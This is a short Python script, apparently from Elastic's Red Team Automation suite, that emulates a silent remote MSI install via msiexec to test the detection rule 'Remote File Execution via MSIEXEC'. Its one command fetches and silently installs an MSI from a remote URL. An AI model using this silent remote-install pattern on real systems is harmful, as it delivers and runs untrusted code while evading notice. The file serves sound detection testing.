# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="de245f02-8614-4fdd-b6e4-e845bbadd056",
    name="msiexec_remote_msi",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[RuleMetadata(id="8ba98e28-d83e-451e-8df7-f0964f7e69b6", name="Remote File Execution via MSIEXEC")],
    techniques=["T1218"],
)
def main():
    # Execute command
    log.info("Trying to fetch remote non-existent MSI")
    _ = _common.execute_command(
        ["msiexec.exe", "/q", "/i", "https://8.8.8.8/bin/Installer.msi"],
        timeout_secs=5,
    )
